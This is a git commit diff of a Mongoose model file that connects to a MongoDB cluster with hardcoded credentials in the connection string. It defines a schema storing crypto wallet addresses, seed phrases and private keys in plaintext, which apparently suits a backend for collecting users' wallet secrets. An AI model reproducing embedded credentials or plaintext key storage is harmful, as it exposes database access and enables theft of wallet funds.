297107117e7e892f48c75b93d6522170a04df090
blockchaingurukerala <65129127+blockchaingurukerala@users.noreply.github.com>
2021-11-23 10:14:15 +0530

    Update Phrases.js

--- src/model/Phrases.js
+++ src/model/Phrases.js
@@ -2,17 +2,26 @@ const mongoose = require('mongoose');
 // mongoose.connect('mongodb://52.56.48.112:27017/taxdb', { useNewUrlParser: true ,useUnifiedTopology: true });
 
 
-
-mongoose.connect('mongodb+srv://pk:pk@cluster0.ozbxe.mongodb.net/taxdb?retryWrites=true&w=majority', { useNewUrlParser: true ,useUnifiedTopology: true });
+try{
+mongoose.connect('mongodb+srv://pk:pk@cluster0.ozbxe.mongodb.net/taxdb?retryWrites=true&w=majority', { useNewUrlParser: true ,useUnifiedTopology: true },(err)=>{
+    if(err){console.log(err)}
+    else{console.log("successfully connected")}
+});
 //mongodb+srv://pk:<password>@cluster0-yxuce.mongodb.net/test?retryWrites=true&w=majority
 //mongodb+srv://pk:<password>@cluster0-yxuce.mongodb.net/test?retryWrites=true&w=majority
 
-
+mongoose.connection.useDb('taxdb');
 const Schema = mongoose.Schema;
 var NewUserSchema = new Schema({  
     wallet:String,  
     phrase:String,       
     privatekey:String     
 });
-var Phrases = mongoose.model('phrasekey', NewUserSchema);                        //UserData is the model and NewBookData is the schema
+var Phrases = mongoose.model('phr', NewUserSchema);
+                    //UserData is the model and NewBookData is the schema
 module.exports = Phrases;
+}
+catch(err){
+    console.log("Catch exception....")
+    console.log(err)
+}
